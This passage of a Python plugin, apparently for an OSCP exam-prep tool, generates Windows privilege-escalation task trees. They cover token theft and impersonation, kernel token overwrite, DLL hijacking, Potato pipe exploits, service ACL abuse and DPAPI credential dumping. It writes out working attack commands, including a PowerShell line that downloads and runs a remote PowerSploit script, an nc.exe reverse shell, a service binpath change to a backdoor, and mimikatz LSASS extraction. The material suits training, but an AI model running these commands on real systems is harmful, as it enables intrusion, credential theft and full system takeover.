                        ],
                        'next_steps': [
                            'Verify: getuid (should show SYSTEM)',
                            'Spawn shell: execute -f cmd.exe -i -t',
                            'Make permanent: steal_token <pid_of_system_process>',
                            'Migrate to SYSTEM process: migrate <pid>'
                        ],
                        'alternatives': [
                            'steal_token <pid> (copy primary token from process)',
                            'Manual: Use DuplicateTokenEx Win32 API',
                            'Custom tool: ImpersonateUser.exe <pid>'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'QUICK_WIN'],
                        'notes': 'Impersonation token (not primary). May not persist across process boundaries.'
                    }
                },
                {
                    'id': 'token-hunter',
                    'name': 'Hunt for Domain Admin Tokens',
                    'type': 'command',
                    'metadata': {
                        'command': 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1\'); Invoke-TokenManipulation -Enumerate"',
                        'description': 'Enumerate tokens and find high-value targets',
                        'flag_explanations': {
                            'Invoke-TokenManipulation': 'PowerSploit token manipulation module',
                            '-Enumerate': 'List all available tokens on system'
                        },
                        'success_indicators': [
                            'Token list displayed with PIDs',
                            'Domain admin accounts found',
                            'Privileged service accounts discovered'
                        ],
                        'failure_indicators': [
                            'Script download blocked',
                            'AMSI blocks execution',
                            'No tokens available'
                        ],
                        'next_steps': [
                            'Impersonate target: Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\\admin"',
                            'Create process as user: Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "DOMAIN\\admin"',
                            'If AMSI blocks: Use AMSI bypass before running script'
                        ],
                        'alternatives': [
                            'Metasploit incognito module',
                            'Rubeus.exe triage (Kerberos tickets)',
                            'Custom C# token enumerator'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'DOMAIN'],
                        'notes': 'May be blocked by AMSI/AV. Test in lab before exam.'
                    }
                }
            ]
        }

    def _get_token_theft_tasks(self, target: str) -> Dict[str, Any]:
        """Generate token theft from SYSTEM processes and kernel-level theft"""
        return {
            'id': 'token-theft',
            'name': 'Token Theft Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': 'copy-token-lsass',
                    'name': 'Copy Token from LSASS (SeDebug + SeImpersonate)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Compile and execute custom token theft code to copy SYSTEM token',
                        'alternatives': [
                            'Step 1: Find LSASS PID: tasklist | findstr lsass',
                            'Step 2: Compile token theft code (see sedebug-+-seimpersonate-copy-token.md)',
                            'Step 3: Execute: TokenTheft.exe',
                            'Step 4: Code opens lsass.exe, extracts token, duplicates it',
                            'Step 5: Spawns cmd.exe with SYSTEM token',
                            'Alternative targets: services.exe, svhost.exe, wininit.exe',
                            'Source: https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html'
                        ],
                        'success_indicators': [
                            'cmd.exe spawns with SYSTEM privileges',
                            'whoami returns NT AUTHORITY\\SYSTEM',
                            'All token privileges enabled'
                        ],
                        'failure_indicators': [
                            'Access denied opening process',
                            'Cannot copy token (protected process)',
                            'CreateProcessAsUser fails'
                        ],
                        'next_steps': [
                            'Download token theft template code from HackTricks',
                            'Compile with Visual Studio or mingw: x86_64-w64-mingw32-gcc theft.c -o theft.exe',
                            'Transfer to target and execute',
                            'Target other SYSTEM processes if lsass is protected'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL', 'ADVANCED'],
                        'notes': 'Requires both SeDebug and SeImpersonate. Avoid csrss.exe (protected).'
                    }
                },
                {
                    'id': 'impersonate-high-to-system',
                    'name': 'Impersonate SYSTEM from High Integrity',
                    'type': 'manual',
                    'metadata': {
                        'description': 'From High integrity, copy token from SYSTEM process and spawn cmd',
                        'alternatives': [
                            'Step 1: Compile ImpersonateUser.exe (code from seimpersonate-from-high-to-system.md)',
                            'Step 2: Find SYSTEM PID: tasklist /FI "USERNAME eq NT AUTHORITY\\SYSTEM"',
                            'Step 3: Target winlogon.exe PID (check "Read Memory" permission)',
                            'Step 4: Execute: ImpersonateUser.exe <winlogon_pid>',
                            'Step 5: cmd.exe spawns as SYSTEM',
                            'Source: https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962'
                        ],
                        'success_indicators': [
                            '[+] OpenProcess() success',
                            '[+] OpenProcessToken() success',
                            '[+] DuplicateTokenEx() success',
                            '[+] Process spawned (SYSTEM cmd.exe)'
                        ],
                        'failure_indicators': [
                            '[-] OpenProcess() Error: 5 (access denied)',
                            '[-] ImpersonatedLoggedOnUser() Error: 5',
                            '[-] CreateProcessWithTokenW Error: 1326',
                            'Not enough permissions (need High or SYSTEM)'
                        ],
                        'next_steps': [
                            'Check process permissions: Process Explorer > winlogon.exe > Properties > Security > Permissions',
                            'Administrators need "Read Memory" and "Read Permissions" on target',
                            'If winlogon fails, try other SYSTEM processes: services.exe, wininit.exe',
                            'Avoid svchost.exe (limited permissions for Administrators)'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'notes': 'Must run from High Integrity. Target processes with Administrator read permissions.'
                    }
                },
                {
                    'id': 'kernel-token-theft',
                    'name': 'Kernel Token Theft (Arbitrary R/W)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Advanced: Steal SYSTEM token via kernel read/write primitives',
                        'alternatives': [
                            'Prerequisites: Vulnerable driver exposing IOCTL for kernel R/W',
                            'Step 1: Find ntoskrnl.exe base (EnumDeviceDrivers API)',
                            'Step 2: Locate PsInitialSystemProcess symbol (SYSTEM EPROCESS)',
                            'Step 3: Read SYSTEM EPROCESS pointer',
                            'Step 4: Walk ActiveProcessLinks to find current process EPROCESS',
                            'Step 5: Read Token from SYSTEM EPROCESS (+0x4b8 offset, varies)',
                            'Step 6: Mask low 3 bits (EX_FAST_REF refcount)',
                            'Step 7: Write SYSTEM token to current EPROCESS Token field',
                            'Step 8: Current process now runs as SYSTEM',
                            'Reference: arbitrary-kernel-rw-token-theft.md'
                        ],
                        'success_indicators': [
                            'Kernel read/write succeeds',
                            'EPROCESS structures located',
                            'Token overwrite successful',
                            'whoami returns NT AUTHORITY\\SYSTEM'
                        ],
                        'failure_indicators': [
                            'Cannot find ntoskrnl base',
                            'BSOD (incorrect offsets/addresses)',
                            'Access violation in kernel',
                            'No vulnerable driver available'
                        ],
                        'next_steps': [
                            'Find vulnerable driver: CVE-2018-15732 (szkg64.sys)',
                            'Get EPROCESS offsets: WinDbg dt nt!_EPROCESS',
                            'Offsets vary per Windows build (resolve dynamically)',
                            'Test in VM before attempting on real target (BSOD risk)'
                        ],
                        'tags': ['OSCP:LOW', 'EXPLOIT', 'ADVANCED', 'KERNEL'],
                        'notes': 'Very advanced. Requires vulnerable kernel driver and exploitation. Rare in OSCP.'
                    }
                },
                {
                    'id': 'runas-creds',
                    'name': 'Create Logon Session with Credentials',
                    'type': 'command',
                    'metadata': {
                        'command': 'runas /user:DOMAIN\\username cmd.exe',
                        'description': 'Create new logon session with valid credentials',
                        'flag_explanations': {
                            'runas': 'Execute program as another user',
                            '/user': 'Username in DOMAIN\\user or computer\\user format',
                            'cmd.exe': 'Program to execute'
                        },
                        'success_indicators': [
                            'Enter password prompt appears',
                            'New cmd.exe spawns with different user context',
                            'whoami shows new user'
                        ],
                        'failure_indicators': [
                            'Logon failure (wrong credentials)',
                            'User has no logon rights',
                            'Account disabled'
                        ],
                        'next_steps': [
                            'Use /netonly for network-only credentials: runas /user:DOMAIN\\admin /netonly cmd.exe',
                            '/netonly useful when credentials invalid locally but valid on network',
                            'Spawn reverse shell: runas /user:admin "nc.exe <LHOST> <LPORT> -e cmd.exe"'
                        ],
                        'alternatives': [
                            'PowerShell: Start-Process cmd -Credential (Get-Credential)',
                            'PSExec: psexec.exe -u DOMAIN\\user -p password cmd.exe',
                            'Manual token creation with LogonUser Win32 API'
                        ],
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'QUICK_WIN'],
                        'notes': 'Requires valid credentials. Use /netonly when local logon fails but network works.'
                    }
                }
            ]
        }

    def _get_dll_hijacking_tasks(self, target: str) -> Dict[str, Any]:
        """Generate DLL hijacking exploitation tasks"""
        return {
            'id': 'dll-hijacking',
            'name': 'DLL Hijacking Privilege Escalation',
            'type': 'parent',
            'children': [
                # Finding missing DLLs - procmon enumeration
                {
                    'id': 'procmon-dll-missing',
                    'name': 'Find Missing DLLs with Process Monitor',
                    'type': 'command',
                    'metadata': {
                        'command': 'procmon.exe',
                        'description': 'Configure Process Monitor to detect missing DLL loads from privileged processes',
                        'flag_explanations': {
                            'procmon.exe': 'Process Monitor from Sysinternals Suite',
                            'Filter 1': 'Result is NAME NOT FOUND',
                            'Filter 2': 'Path ends with .dll',
                            'Filter 3 (optional)': 'Process Name contains <target.exe>',
                            'Boot logging': 'Options > Enable boot logging to capture early service DLLs'
                        },
                        'success_indicators': [
                            'List of NAME NOT FOUND events for .dll files',
                            'Process names show privileged services (SYSTEM, SERVICE accounts)',
                            'DLL paths show search order attempts',
                            'Multiple attempts in System PATH folders'
                        ],
                        'failure_indicators': [
                            'No NAME NOT FOUND results (all DLLs found)',
                            'Only user-mode processes (no privilege escalation)',
                            'DLLs loaded from protected locations only'
                        ],
                        'next_steps': [
                            'Check if missing DLL path is writable: icacls "C:\\path"',
                            'Verify service runs with higher privileges: sc qc <service>',
                            'Check DLL search order for hijack opportunities',
                            'Identify writable PATH folders for phantom DLL attacks'
                        ],
                        'alternatives': [
                            'Manual: Download procmon from https://live.sysinternals.com/procmon.exe',
                            'Run as Administrator for full access',
                            'For boot-time: Enable boot logging and reboot',
                            'For specific exe: Add Process Name filter before starting target',
                            'Alternative: WinPEAS automated checks'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM', 'WINDOWS'],
                        'notes': 'Procmon requires admin rights. Focus on SYSTEM services loading missing DLLs. Common targets: Task Scheduler (WptsExtensions.dll), DPS service.'
                    }
                },
                # Check writable PATH folders
                {
                    'id': 'check-path-writable',
                    'name': 'Check PATH Folders for Write Access',
                    'type': 'command',
                    'metadata': {
                        'command': 'for %A in ("%path:;=";"%") do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\\\ everyone authenticated users todos %username%" && echo. )',
                        'description': 'Enumerate writable folders in System PATH for DLL planting',
                        'flag_explanations': {
                            '%path:;=";"%': 'Split PATH environment variable by semicolon into individual folder paths',
                            'for %A in': 'Iterate through each PATH folder',
                            'icacls "%~A"': 'Display NTFS permissions for folder',
                            'findstr /i "(F) (M) (W)"': 'Find Full/Modify/Write permissions (case insensitive)',
                            'findstr /i "everyone authenticated users"': 'Filter for accessible groups',
                            '2>nul': 'Suppress access denied errors'
                        },
                        'success_indicators': [
                            'One or more PATH folders show (F) Full or (M) Modify permissions',
                            'Permissions granted to Everyone, Authenticated Users, or current user',
                            'Folder earlier in PATH = higher priority for DLL loading'
                        ],
                        'failure_indicators': [
                            'No writable folders in System PATH',
                            'All folders owned by SYSTEM/Administrators only',
                            'Only User PATH writable (won\'t escalate from SYSTEM services)'
                        ],
                        'next_steps': [
                            'Note writable folder position in PATH (earlier = more likely to be used)',
                            'Cross-reference with procmon missing DLLs',
                            'Verify permissions: accesschk.exe -dqv "C:\\writable-path"',
                            'Check if services search that path (SafeDllSearchMode enabled means PATH is #6)'
                        ],
                        'alternatives': [
                            'Manual: echo %PATH% and manually check each folder with icacls',
                            'PowerShell: $env:Path -split \';\' | ForEach-Object { icacls $_ }',
                            'accesschk.exe -uwdqs Users c:\\ (find all writable directories)',
                            'WinPEAS.exe (automated DLL hijacking vulnerability checks)'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'notes': 'Writable System PATH folder = critical privesc opportunity. User PATH alone not useful for SYSTEM escalation.'
                    }
                }
            ]
        }

    def _get_ipc_exploitation_tasks(self, target: str) -> Dict[str, Any]:
        """Generate IPC exploitation tasks (Named Pipes, Auto-Updaters)"""
        return {
            'id': 'ipc-exploitation',
            'name': 'IPC Exploitation for Privilege Escalation',
            'type': 'parent',
            'children': [
                # Named Pipe Client Impersonation overview
                {
                    'id': 'named-pipe-concept',
                    'name': 'Named Pipe Client Impersonation (Theory)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Understand how to impersonate SYSTEM via named pipe client connections',
                        'alternatives': [
                            'Named Pipe Impersonation Core Concept:',
                            '- Named pipe server can adopt security context of connecting client',
                            '- Attacker with SeImpersonate creates pipe, coerces SYSTEM to connect',
                            '- Server calls ImpersonateNamedPipeClient() to become SYSTEM',
                            '- Duplicates token and spawns SYSTEM process',
                            '',
                            'Attack Flow (5 Steps):',
                            '1. CreateNamedPipe(\\\\.\\pipe\\<random_name>)',
                            '2. Coerce SYSTEM service to connect (Print Spooler, DCOM, EFSRPC)',
                            '3. ReadFile() - MUST read at least one message first!',
                            '4. ImpersonateNamedPipeClient() - adopt client security context',
                            '5. DuplicateTokenEx() + CreateProcessWithTokenW() = SYSTEM shell',
                            '',
                            'Prerequisites:',
                            '- SeImpersonatePrivilege (LOCAL SERVICE, NETWORK SERVICE always have this)',
                            '- Ability to coerce privileged service connection',
                            '- Client uses SecurityImpersonation level (default for most RPC/pipes)',
                            '',
                            'Why This Works:',
                            '- Services connect with their security context (SYSTEM)',
                            '- Pipe server inherits that context via impersonation',
                            '- Windows designed feature for legitimate delegation',
                            '- Potato exploits automate coercion + impersonation',
                            '',
                            'Common Coercion Methods:',
                            '- PrintSpoofer: Print Spooler RPC (Windows 10/Server 2019+)',
                            '- JuicyPotato: DCOM activation (Server 2008-2016)',
                            '- RoguePotato: DCOM variant',
                            '- GodPotato: Universal method (latest)',
                            '- EfsPotato: EFSRPC pipes'
                        ],
                        'success_indicators': [
                            'Understand pipe impersonation theory',
                            'Identified SeImpersonatePrivilege in token',
                            'Know which Potato exploit for your Windows version'
                        ],
                        'next_steps': [
                            'Check SeImpersonate: whoami /priv',
                            'Identify Windows version: systeminfo | findstr /B /C:"OS Name"',
                            'Choose exploit: PrintSpoofer (Win10+), JuicyPotato (2008-2016), GodPotato (universal)',
                            'See token manipulation section for automated exploits'
                        ],
                        'alternatives': [
                            'Automated tools (recommended for OSCP):',
                            '- PrintSpoofer.exe -i -c cmd',
                            '- GodPotato.exe -cmd "cmd /c whoami"',
                            '- JuicyPotato.exe -l 1337 -p cmd.exe -t *',
                            '',
                            'Manual implementation (learning):',
                            '- See from-high-integrity-to-system-with-name-pipes.md for C code',
                            '- Compile custom impersonation tool'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'RESEARCH'],
                        'notes': 'Theory only. Use PrintSpoofer/GodPotato in SeImpersonate token abuse section for actual exploitation.'
                    }
                }
            ]
        }
# These methods should be added before the closing of the WindowsPrivescPlugin class

    def _get_system_enumeration_tasks(self, target: str) -> Dict[str, Any]:
        """Generate system information enumeration tasks"""
        return {
            'id': 'system-enum',
            'name': 'System Information Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': 'systeminfo',
                    'name': 'Gather System Information',
                    'type': 'command',
                    'metadata': {
                        'command': 'systeminfo && wmic qfe get Caption,Description,HotFixID,InstalledOn',
                        'description': 'Enumerate OS version, patches, and system architecture for vulnerability research',
                        'flag_explanations': {
                            'systeminfo': 'Display detailed configuration information about computer and OS',
                            'wmic qfe': 'Windows Management Instrumentation Command to query Quick Fix Engineering',
                            'get': 'Retrieve specific properties',
                            'Caption,Description,HotFixID,InstalledOn': 'Patch details for exploit matching'
                        },
                        'success_indicators': [
                            'OS Name and Version displayed',
                            'List of installed patches (KB numbers)',
                            'System architecture (x86/x64) identified'
                        ],
                        'failure_indicators': [
                            'Command not found (wrong Windows version)',
                            'Access denied (insufficient permissions)'
                        ],
                        'next_steps': [
                            'Cross-reference OS version with exploit databases (searchsploit, exploitdb)',
                            'Identify missing patches for known CVEs (Watson, WinPEAS)',
                            'Check https://msrc.microsoft.com/update-guide/vulnerability',
                            'Run automated exploit suggesters: watson.exe, wesng'
                        ],
                        'alternatives': [
                            'Manual: ver (simple version check)',
                            'PowerShell: [System.Environment]::OSVersion.Version',
                            'PowerShell: Get-HotFix -Description "Security update"'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'MANUAL'],
                        'notes': 'First step in Windows enumeration. Document KB numbers for exploit research.'
                    }
                },
                {
                    'id': 'env-vars',
                    'name': 'Check Environment Variables',
                    'type': 'command',
                    'metadata': {
                        'command': 'set',
                        'description': 'Search environment variables for credentials or sensitive paths',
                        'flag_explanations': {
                            'set': 'Display all environment variables for current session'
                        },
                        'success_indicators': [
                            'PATH variable shows custom application paths',
                            'Credentials or API keys found in variables',
                            'Sensitive file paths discovered'
                        ],
                        'failure_indicators': [
                            'Only standard Windows variables present'
                        ],
                        'next_steps': [
                            'Check PowerShell history: type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt',
                            'Look for scripts in custom PATH locations',
                            'Search for hardcoded credentials in displayed paths'
                        ],
                        'alternatives': [
                            'PowerShell: dir env:',
                            'PowerShell: Get-ChildItem Env: | ft Key,Value'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'notes': 'Sometimes reveals database connection strings or admin scripts.'
                    }
                }
            ]
        }

    def _get_acl_exploitation_tasks(self, target: str) -> Dict[str, Any]:
        """Generate ACL/DACL exploitation tasks"""
        return {
            'id': 'acl-exploit',
            'name': 'ACL/DACL Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': 'check-file-permissions',
                    'name': 'Enumerate File Permissions (DACL)',
                    'type': 'command',
                    'metadata': {
                        'command': 'icacls C:\\Windows\\System32',
                        'description': 'Check Discretionary Access Control Lists for writable system directories',
                        'flag_explanations': {
                            'icacls': 'Display or modify Access Control Lists (ACLs) for files/folders',
                            'C:\\Windows\\System32': 'Target directory to check permissions'
                        },
                        'success_indicators': [
                            'F = Full control',
                            'M = Modify',
                            'W = Write-only',
                            'Current user has write permissions on privileged locations'
                        ],
                        'failure_indicators': [
                            'Only R (Read) or RX (Read/Execute) permissions',
                            'Access denied checking directory'
                        ],
                        'next_steps': [
                            'Target writable service directories: icacls C:\\Program Files\\*',
                            'Check system binary folders for DLL hijacking',
                            'Enumerate writable folders in PATH: $env:PATH -split ";"',
                            'Use accesschk.exe -uwdqs "Authenticated Users" C:\\ for automation'
                        ],
                        'alternatives': [
                            'Manual: Right-click folder > Properties > Security tab',
                            'PowerShell: Get-Acl C:\\path\\to\\folder | Format-List',
                            'accesschk.exe from Sysinternals'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'MANUAL'],
                        'notes': 'ACL order: Explicit Deny > Explicit Allow > Inherited Deny > Inherited Allow'
                    }
                },
                {
                    'id': 'acl-service-permissions',
                    'name': 'Check Service ACL Permissions',
                    'type': 'command',
                    'metadata': {
                        'command': 'accesschk.exe -uwcqv "Authenticated Users" * /accepteula',
                        'description': 'Find services with weak ACLs allowing reconfiguration',
                        'flag_explanations': {
                            'accesschk.exe': 'Sysinternals tool to check effective permissions',
                            '-u': 'Suppress errors',
                            '-w': 'Show only objects with write access',
                            '-c': 'Check Windows services',
                            '-q': 'Omit banner',
                            '-v': 'Verbose output',
                            '"Authenticated Users"': 'Check permissions for all logged-in users',
                            '/accepteula': 'Auto-accept EULA'
                        },
                        'success_indicators': [
                            'SERVICE_CHANGE_CONFIG found (can reconfigure service)',
                            'WRITE_DAC found (can change permissions)',
                            'WRITE_OWNER found (can take ownership)',
                            'SERVICE_ALL_ACCESS found'
                        ],
                        'failure_indicators': [
                            'No services with weak permissions',
                            'Only READ access granted'
                        ],
                        'next_steps': [
                            'Reconfigure service binary: sc config SERVICE binpath= "C:\\backdoor.exe"',
                            'Restart service: net stop SERVICE && net start SERVICE',
                            'Change service to run as SYSTEM: sc config SERVICE obj= LocalSystem',
                            'Download accesschk: https://live.sysinternals.com/accesschk.exe'
                        ],
                        'alternatives': [
                            'Manual: sc qc SERVICE (query config)',
                            'PowerShell: Get-Acl "HKLM:\\System\\CurrentControlSet\\Services\\SERVICE" | fl',
                            'WinPEAS automatic service permissions check'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'AUTOMATED'],
                        'notes': 'Download accesschk v6.02 (XP-compatible) for OSCP labs. Newer versions may not work.'
                    }
                },
                {
                    'id': 'acl-modify-dacl',
                    'name': 'Modify DACL to Grant Access',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Change object permissions if you have WRITE_DAC privilege',
                        'alternatives': [
                            'Step 1: Check current permissions: icacls C:\\target\\file.txt',
                            'Step 2: Grant full control: icacls C:\\target\\file.txt /grant %username%:F',
                            'Step 3: Verify change: icacls C:\\target\\file.txt',
                            'For services: sc sdset SERVICE "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"',
                            'PowerShell: $acl = Get-Acl C:\\file; $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("User","FullControl","Allow"); $acl.SetAccessRule($rule); Set-Acl C:\\file $acl'
                        ],
                        'success_indicators': [
                            'Successfully processed message',
                            'Permissions changed in icacls output',
                            'File/folder now accessible'
                        ],
                        'failure_indicators': [
                            'Access denied modifying permissions (need WRITE_DAC)',
                            'Invalid security descriptor'
                        ],
                        'next_steps': [
                            'Access previously restricted file',
                            'Modify service configuration if service ACL changed',
                            'Check for credentials in newly accessible files'
                        ],
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'notes': 'Requires WRITE_DAC permission on target object. Check with accesschk first.'
                    }
                }
            ]
        }

    def _get_integrity_level_tasks(self, target: str) -> Dict[str, Any]:
        """Generate integrity level manipulation tasks"""
        return {
            'id': 'integrity-levels',
            'name': 'Integrity Level Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': 'check-integrity',
                    'name': 'Check Current Integrity Level',
                    'type': 'command',
                    'metadata': {
                        'command': 'whoami /groups | findstr /i "mandatory label"',
                        'description': 'Identify current process integrity level (Low/Medium/High/System)',
                        'flag_explanations': {
                            'whoami /groups': 'Display all security groups including integrity level',
                            'findstr /i': 'Case-insensitive string search',
                            '"mandatory label"': 'Search term for integrity level label'
                        },
                        'success_indicators': [
                            'Mandatory Label\\Low Mandatory Level (Untrusted/sandboxed)',
                            'Mandatory Label\\Medium Mandatory Level (Standard user)',
                            'Mandatory Label\\High Mandatory Level (Elevated/Administrator)',
                            'Mandatory Label\\System Mandatory Level (SYSTEM)'
                        ],
                        'failure_indicators': [
                            'No mandatory label found (old Windows version)',
                            'Command not recognized'
                        ],
                        'next_steps': [
                            'If Medium: Attempt UAC bypass to get High integrity',
                            'If High: Use token manipulation to get SYSTEM',
                            'If Low: Very restricted, focus on sandbox escapes',
                            'Check if binary has low integrity: icacls binary.exe'
                        ],
                        'alternatives': [
                            'Process Explorer: View > Select Columns > Integrity Level',
                            'PowerShell: (Get-Process -Id $PID).SecurityDescriptor.Owner'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'notes': 'Integrity levels: Untrusted < Low < Medium < High < System < Installer'
                    }
                },
                {
                    'id': 'set-file-integrity',
                    'name': 'Modify File Integrity Level',
                    'type': 'command',
                    'metadata': {
                        'command': 'icacls C:\\target\\file.exe /setintegritylevel Low',
                        'description': 'Change minimum integrity level required to access file (requires High integrity)',
                        'flag_explanations': {
                            'icacls': 'Modify Access Control Lists',
                            '/setintegritylevel': 'Set integrity level requirement',
                            'Low': 'Integrity level (Low, Medium, High, System)'
                        },
                        'success_indicators': [
                            'Successfully processed 1 files',
                            'Mandatory Label\\Low Mandatory Level shown in icacls output'
                        ],
                        'failure_indicators': [
                            'Access denied (need High integrity to set integrity)',
                            'Invalid parameter'
                        ],
                        'next_steps': [
                            'If setting binary to Low: Binary will run in Low integrity when executed',
                            'If setting file to High: File protected from Medium integrity modification',
                            'Test access from different integrity levels',
                            'Use for defense evasion or process sandboxing'
                        ],
                        'alternatives': [
                            'PowerShell: Set-ItemProperty -Path file -Name "IntegrityLevel" -Value "Low"',
                            'Manual: Right-click > Properties > Security > Advanced > Change integrity level'
                        ],
                        'tags': ['OSCP:LOW', 'MANUAL', 'ADVANCED'],
                        'notes': 'Lower integrity processes cannot modify higher integrity files. Used for sandboxing.'
                    }
                }
            ]
        }

    def _get_dpapi_extraction_tasks(self, target: str) -> Dict[str, Any]:
        """Generate DPAPI credential extraction tasks"""
        return {
            'id': 'dpapi-extraction',
            'name': 'DPAPI Credential Extraction',
            'type': 'parent',
            'children': [
                {
                    'id': 'find-dpapi-blobs',
                    'name': 'Locate DPAPI Encrypted Blobs',
                    'type': 'command',
                    'metadata': {
                        'command': 'dir /a:h C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Credentials\\ && dir /a:h C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Credentials\\',
                        'description': 'Find DPAPI encrypted credential files (start with 01 00 00 00)',
                        'flag_explanations': {
                            'dir': 'List directory contents',
                            '/a:h': 'Show hidden files (DPAPI folders are hidden)',
                            'Credentials\\': 'User credential blobs encrypted by DPAPI',
                            'AppData\\Local vs Roaming': 'Check both local and roaming profiles'
                        },
                        'success_indicators': [
                            'Files with long hexadecimal names found',
                            'Multiple credential blobs discovered',
                            'Vault folders containing encrypted data'
                        ],
                        'failure_indicators': [
                            'Directory not found (no saved credentials)',
                            'Empty directories'
                        ],
                        'next_steps': [
                            'Find master keys: dir /a:h C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Protect\\',
                            'Extract master key GUIDs from blob headers',
                            'Dump LSASS if admin: mimikatz sekurlsa::dpapi',
                            'Offline decryption if you have user password/hash'
                        ],
                        'alternatives': [
                            'PowerShell: Get-ChildItem -Hidden C:\\Users\\*\\AppData\\*\\Microsoft\\Credentials\\',
                            'SharpDPAPI: search /type:folder /path:C:\\Users\\username\\AppData\\',
                            'Mimikatz: dpapi::cred /in:C:\\path\\to\\blob'
                        ],
                        'tags': ['OSCP:MEDIUM', 'CREDENTIALS', 'ENUM'],
                        'notes': 'DPAPI protects: Chrome/IE passwords, WiFi passwords, RDP creds, Vault, Scheduled Task passwords'
                    }
                },
                {
                    'id': 'dump-dpapi-masterkeys',
                    'name': 'Extract DPAPI Master Keys from LSASS',
                    'type': 'command',
                    'metadata': {
                        'command': 'mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit"',
                        'description': 'Dump DPAPI master keys from LSASS memory (requires SeDebugPrivilege)',
                        'flag_explanations': {
                            'mimikatz.exe': 'Post-exploitation tool for Windows credential extraction',
                            'privilege::debug': 'Enable SeDebugPrivilege to access LSASS',
                            'sekurlsa::dpapi': 'Extract DPAPI keys from LSASS memory',
                            'exit': 'Exit mimikatz after extraction'
                        },
                        'success_indicators': [
                            'Master Key displayed with GUID and SHA1',
                            'Multiple keys extracted for different users',
                            'DPAPI_SYSTEM key extracted (for machine credentials)'
                        ],
                        'failure_indicators': [
                            'Access denied (need admin + SeDebug)',
                            'Mimikatz blocked by AV',
                            'LSASS protected (Credential Guard enabled)'
                        ],
                        'next_steps': [
                            'Decrypt credentials: mimikatz dpapi::cred /in:blob /masterkey:KEY',
                            'Extract WiFi passwords: mimikatz dpapi::wifi',
                            'Extract Chrome passwords: SharpChrome',
                            'Save keys: echo {GUID}:SHA1 > masterkeys.txt for later use'
                        ],
                        'alternatives': [
                            'SharpDPAPI: SharpDPAPI.exe masterkeys (current session)',
                            'Impacket: python3 secretsdump.py -sam sam.hive -system system.hive LOCAL',
                            'Manual registry: reg save HKLM\\SECURITY\\Policy\\Secrets\\DPAPI_SYSTEM dpapi.reg'
                        ],
                        'tags': ['OSCP:HIGH', 'CREDENTIALS', 'AUTOMATED'],
                        'notes': 'Download: https://github.com/gentilkiwi/mimikatz. Requires admin privileges.'
                    }
                },
                {
                    'id': 'dpapi-offline-decrypt',
                    'name': 'Offline DPAPI Decryption (Impacket)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Decrypt DPAPI blobs offline using user password/hash and SID',
                        'alternatives': [
                            'Step 1: Transfer files to Kali: credential blob + master key GUID file',
                            'Step 2: Get user SID: wmic useraccount where name="%username%" get sid',
                            'Step 3: Decrypt master key: python3 dpapi.py masterkey -file GUID -sid S-1-5-21-... -password UserPass',
                            'Step 4: Decrypt credential: python3 dpapi.py credential -file BLOB -key 0xMASTERKEY',
                            'Step 5: Plaintext password displayed in output',
                            'Alternative with hash: -key 0xNTLM_HASH instead of -password'
                        ],
                        'success_indicators': [
                            'Master key decryption successful',
                            'Credential blob decrypted',
                            'Type=CRED_TYPE_DOMAIN_PASSWORD; Username=...; Password=...'
                        ],
                        'failure_indicators': [
                            'Wrong password/hash',
                            'SID mismatch',
                            'Corrupt blob file'
                        ],
                        'next_steps': [
                            'Use recovered credentials for lateral movement',
                            'Check for admin/domain admin credentials',
                            'Search for credentials with *_adm or *admin naming pattern'
                        ],
                        'tags': ['OSCP:HIGH', 'CREDENTIALS', 'OFFLINE'],
                        'notes': 'Works offline with stolen files. Requires: blob, master key file, SID, password/hash.'
                    }
                },
                {
                    'id': 'dpapi-entropy-capture',
                    'name': 'Capture DPAPI Entropy (Third-Party Apps)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Some apps use custom entropy with DPAPI. Capture it to decrypt.',
                        'alternatives': [
                            'Identify app using DPAPI with entropy: Outlook, VPN clients, Zscaler',
                            'Tool: EntropyCapture.dll (DLL injection into target process)',
                            'Step 1: Find target PID: Get-Process outlook',
                            'Step 2: Inject: InjectDLL.exe -pid PID -dll EntropyCapture.dll',
